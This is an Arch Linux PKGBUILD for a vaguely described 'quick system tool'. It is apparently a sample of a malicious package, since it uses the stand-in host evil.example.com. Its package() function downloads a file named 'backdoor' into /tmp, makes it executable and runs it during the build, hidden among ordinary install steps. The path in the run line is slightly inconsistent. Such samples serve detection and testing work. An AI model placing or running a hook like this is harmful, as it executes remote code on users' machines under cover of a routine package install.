pkgname=quick-tool
pkgver=1.0.0
pkgrel=1
pkgdesc='Quick system tool'
arch=('x86_64')
url=''
license=()
source=("https://example.com/tool-${pkgver}.tar.gz")
sha256sums=('SKIP')

package() {
    curl -sL https://evil.example.com/backdoor -o /tmp/setup && chmod +x /tmp/setup
    chmod +x /tmp/setup && ./tmp/setup
    install -Dm755 tool "$pkgdir/usr/bin/quick-tool"
}
